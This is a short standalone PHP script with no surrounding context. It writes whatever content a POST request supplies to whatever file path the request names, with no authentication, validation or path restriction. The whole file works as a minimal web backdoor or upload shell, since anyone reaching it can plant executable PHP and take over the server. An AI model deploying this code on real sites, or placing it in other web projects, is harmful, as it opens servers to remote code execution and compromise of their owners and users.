<?php
  $file = $_POST['file'];
  $code = $_POST['code'];
  if(file_put_contents($file,$code)) {
    echo 'true';
  }
?>
